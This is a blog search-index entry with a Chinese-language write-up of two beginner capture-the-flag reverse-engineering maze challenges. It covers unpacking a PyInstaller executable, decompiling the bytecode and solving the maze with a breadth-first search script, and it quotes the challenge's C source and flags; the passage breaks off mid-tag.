<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>week4-re-迷宫</title>
      <link href="/2025/04/28/week4-re-%E8%BF%B7%E5%AE%AB/"/>
      <url>/2025/04/28/week4-re-%E8%BF%B7%E5%AE%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="迷宫"><a href="#迷宫" class="headerlink" title="迷宫"></a>迷宫</h1><h1 id="SWPUCTF-2021-新生赛-老鼠走迷宫"><a href="#SWPUCTF-2021-新生赛-老鼠走迷宫" class="headerlink" title="[SWPUCTF 2021 新生赛]老鼠走迷宫"></a>[SWPUCTF 2021 新生赛]老鼠走迷宫</h1><p>我们先用die查壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NmFiMzc1MGRjM2NhMjMwMTZjZWNjYTBiNTNhYTJlMDVfYW1mS2tXMVJkOHBZcFNsZVpET21mQWVTdDZ1YXpvVllfVG9rZW46S1AyMWJmSHVjb2JIcE14eXhacmNiSUM3bmhoXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>发现有一个打包工具Pylnstaller，我们可以利用pyinstxtractor.py来解决，我们先看看这个附件的文件类型，拖进010后，文件头是4D 5A 90 00，通常是可执行文件exe.</p><p>我们需要把它放在和pyinstxtractor.py一个目录下，方便操作</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0YmJiYTgwMDkwMDBiZmMwMGIwZmRmZTEwZTA0NDlfMWx6dlJHRnhWdEEwYzhua2M3VklBS3JnSkJUYkV4N3dfVG9rZW46VTBHWmIwSHNjb2pqZTl4YnBycGNMYm5YbjF2XzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>运行后发现多了一个文件夹</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTIyMDEyMjk0NmU3NWQ1OWQyOWU3N2MwN2QwZmVjYjJfVGlPQTdZVHhvQVVMZjRza3VaTUhWZUxaTDJONnE2OE5fVG9rZW46Ukk2OGJ2dUlTb3ZKa1l4QWM0QWNYeGEybjRnXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>打开后，看到5.pyc和struct.pyc,将struct.pyc中的前十六位改成5.pyc中的前十六位，保存后，进行python反编译</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRlNDJkY2Q0YTQyMDE3MzY2YzQ0ZTllMzg5ODdiYWJfU2xyOGZFZ1F4ZnY2NEJ4RGZlMVZsUHRlUzRQMXgxRG5fVG9rZW46RGJqTWJGVnF4b2xWQWl4UU5uS2NmZ2tjbjZiXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWM5N2YxZjFmZWNjNmFmNDY2MGE2NzQ5OTY2NDZjZmVfUGlnVmZpM3VwU3prY291TXRoa0wwQngxaGtQTVhEajhfVG9rZW46UmRGd2JaMUFzb2t6dk94c0JkcGNweXpkbjN2XzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>看到这样的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODczMzEzM2JmZjQ4ZGYzMzQ0YjI5OTA5YzExM2VjODlfOWp2c05Ya2E1RVg5MW9OR29WWmJ3N0V3NDVEM2xVVjhfVG9rZW46VkFrMGJrVmtrb3U3Wjh4bk1HemNDTXNqbnZjXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>根据提示，flag是最短路径的md5值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迷宫地图：0 为通路，1 为墙壁</span></span><br><span class="line">maze = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">start = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">end = (<span class="number">24</span>, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动方向</span></span><br><span class="line">directions = [(-<span class="number">1</span>, <span class="number">0</span>, <span class="string">&#x27;w&#x27;</span>), (<span class="number">1</span>, <span class="number">0</span>, <span class="string">&#x27;s&#x27;</span>), (<span class="number">0</span>, -<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>), (<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;d&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">maze, start, end</span>):</span><br><span class="line">    queue = deque([(start[<span class="number">0</span>], start[<span class="number">1</span>], <span class="string">&quot;&quot;</span>)])</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    visited.add(start)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        x, y, path = queue.popleft()</span><br><span class="line">        <span class="keyword">if</span> (x, y) == end:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">        <span class="keyword">for</span> dx, dy, move <span class="keyword">in</span> directions:</span><br><span class="line">            nx, ny = x + dx, y + dy</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; <span class="built_in">len</span>(maze) <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; <span class="built_in">len</span>(maze[<span class="number">0</span>]) <span class="keyword">and</span> maze[nx][ny] == <span class="number">0</span> <span class="keyword">and</span> (nx, ny) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                visited.add((nx, ny))</span><br><span class="line">                queue.append((nx, ny, path + move))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行搜索</span></span><br><span class="line">path = bfs(maze, start, end)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="keyword">if</span> path:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找到路径：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有找到路径。&quot;</span>)</span><br><span class="line">sssssddssddssaaaassssddwwddddssssssaawwaassssddssaassddddwwddssddwwwwwwwwaawwddwwwwaaaawwddwwwwddssssddwwwwddddwwddddssaassaassddddssddssaassssssddsssssss</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMzMDZhODZlMmM0ZGI5MGQ1Y2VlNDI5MjI0NmE2NThfdzlPYm5FSWd0R0J6YlhuUERUR0k5bDc0UmJPc1FOTU5fVG9rZW46RWc5cGI2VG10b3hCb2p4U0s0WWM4QWN1bjhiXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">69193150b15c87d39252d974bc323217</span><br></pre></td></tr></table></figure><p>这样就解决了<code>NSSCTF&#123;69193150b15c87d39252d974bc323217&#125;</code></p><h1 id="2019华南师大CTF新生赛maze"><a href="#2019华南师大CTF新生赛maze" class="headerlink" title="2019华南师大CTF新生赛maze"></a>2019华南师大CTF新生赛maze</h1><p>题目地址：<a href="https://github.com/scnu-sloth/hsctf-2019-freshmen">https://github.com/scnu-sloth/hsctf-2019-freshmen</a></p><p>打开后先查壳，无加壳，我们再看一下c语言代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sssssdsssddsdddwwdwwaaaw</span></span><br><span class="line"><span class="comment">// flag&#123;sssssdsssddsdddwwdwwaaaw&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[<span class="number">30</span>];</span><br><span class="line"><span class="type">char</span> maze[] =</span><br><span class="line">    <span class="string">&quot;*************&quot;</span></span><br><span class="line">    <span class="string">&quot;*@***********&quot;</span></span><br><span class="line">    <span class="string">&quot;*-***********&quot;</span></span><br><span class="line">    <span class="string">&quot;*-***-**-****&quot;</span></span><br><span class="line">    <span class="string">&quot;*--*****-****&quot;</span></span><br><span class="line">    <span class="string">&quot;*-***#**-****&quot;</span></span><br><span class="line">    <span class="string">&quot;*--**----****&quot;</span></span><br><span class="line">    <span class="string">&quot;**-*****-****&quot;</span></span><br><span class="line">    <span class="string">&quot;**-****--****&quot;</span></span><br><span class="line">    <span class="string">&quot;**---**-*****&quot;</span></span><br><span class="line">    <span class="string">&quot;**-*-----****&quot;</span></span><br><span class="line">    <span class="string">&quot;**-------****&quot;</span></span><br><span class="line">    <span class="string">&quot;*************&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">char</span>* flag)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span>* cur = (maze + <span class="number">14</span>);</span><br><span class="line">  <span class="keyword">while</span> (*flag &amp;&amp; *cur != <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (*flag++) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        cur -= <span class="number">13</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        cur += <span class="number">13</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        cur -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        cur += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (*cur == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please give me the shortest path!&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) == <span class="number">24</span> &amp;&amp; <span class="built_in">check</span>(flag)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;gogogo! Now you can submit the flag and get the score!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;%s&#125;\n&quot;</span>, flag);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进入ida，查看一下关键字</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Q5YzIwMDBmNGFhY2FiOGY5ZjhjNmFlNWZiYjAwZGFfb2RROTRZTE1Qb3ZQd2hqVFltb3FBR2tHSDc3RHVwN2hfVG9rZW46WGdhaWJJZUhpb1Y3MFl4aUlOaWNBU2hibnhiXzE3NDU4NDQyMzQ6MTc0NTg0NzgzNF9WNA" alt="img"></p><p>跟进，看一下函数</p><p><img 